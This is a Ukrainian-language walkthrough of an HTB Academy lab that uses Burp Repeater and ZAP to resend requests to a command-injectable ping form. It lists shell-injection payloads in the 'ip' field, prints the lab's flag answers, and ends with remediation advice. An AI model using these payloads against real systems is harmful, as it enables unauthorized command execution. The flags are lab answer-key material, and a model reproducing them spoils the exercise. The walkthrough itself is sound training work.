# Repeating Requests

## Опис

У попередній секції ми знайшли command injection у формі `Ping Your IP` та отримали перший прапор через параметр `ip`.  
У цій секції використовуємо можливість повторної відправки запитів (Repeater) у проксі, щоб швидко змінювати тіло запиту і знайти інший прапор.

---

## Середовище

- VPN HTB Academy: `academy-regular.ovpn` (tun0 активний).  
- Ціль: `http://<TARGET_IP>:<TARGET_PORT>/` (наприклад, `154.57.164.69:32526`).  
- Уразлива кінцева точка: `POST /ping` з тілом `ip=<значення>`.  
- Інструменти:
  - Burp Suite: Proxy, HTTP history, Repeater.
  - (Опційно) ZAP / ZAP HUD для аналогічного підходу.

---

## Мета

Повторно використовувати один і той самий `POST /ping` запит у Burp Repeater (або ZAP), змінюючи тільки параметр `ip`, щоб:  
- підтвердити наявність command injection;  
- шляхом декількох повторів знайти й прочитати другий прапор.

---

## Розвідка

VPN вже підключений. Перевіряємо доступність цілі:

```bash
ping -c 3 <TARGET_IP>
nc -vz <TARGET_IP> <TARGET_PORT>
Дивимось головну сторінку:

bash
curl -v http://<TARGET_IP>:<TARGET_PORT>/
Бачимо:

форму method="post" action="/ping",

поле name="ip" (останній октет IP).

Надсилаємо один нормальний POST, щоб він потрапив в історію Burp:

bash
curl -v -X POST \
  -d "ip=1" \
  http://<TARGET_IP>:<TARGET_PORT>/ping
Експлуатація через Burp Repeater
1. Базовий запит у Repeater
В Burp → Proxy → HTTP history знаходимо:

text
POST /ping HTTP/1.1
Host: <TARGET_IP>:<TARGET_PORT>

ip=1
Правою кнопкою → Send to Repeater (або Ctrl+R).

Переходимо на вкладку Repeater.

2. Перевірка ін’єкції
У вкладці Request (Repeater) змінюємо тіло:

text
ip=;cat flag.txt;
Натискаємо Send і в Response бачимо перший прапор:

text
HTB{1n73rc3p73d_1n_7h3_m1ddl3}
Це підтверджує, що можна безкінечно повторювати й змінювати цей запит.

3. Пошук іншого прапора
Не змінюючи заголовків, міняємо тільки рядок ip= і кожного разу тиснемо Send.

Приклади корисних payload’ів:

text
ip=;ls;
ip=;ls -la;
ip=;ls -R | grep -i flag;
Після виявлення додаткового файлу з прапором читаємо його:

text
ip=;cat /шлях/до/файлу_з_прапором;
У відповіді з’являється другий прапор:

text
HTB{qu1ckly_r3p3471n6_r3qu3575}
Саме це значення вводимо в полі відповіді секції Repeating Requests в HTB Academy.

Експлуатація через ZAP / ZAP HUD (коротко)
У ZAP History знаходимо POST /ping, відкриваємо через Open/Resend with Request Editor.

Міняємо тіло (ip=;cat flag.txt;, потім інші варіанти) → Send → дивимось відповідь.

У ZAP HUD аналогічно: через історію запитів HUD відкриваємо, редагуємо ip, повторно відправляємо й дивимось прапор у відповіді.

Remediation
Причина: значення ip без перевірки додається до shell‑команди ping, що дозволяє додавати ; та інші розділювачі і виконувати довільні команди.

Захист:

Не використовувати shell для логіки програми, застосовувати бібліотеки/функції мови для роботи з мережею.

Строга валідація вводу (тільки цифри й формат IP), фільтрація небезпечних символів, відмова від конкатенації рядків у команді.

Запускати сервіс з мінімальними правами в ізольованому середовищі (контейнер, chroot), щоб зменшити наслідки ін’єкції.
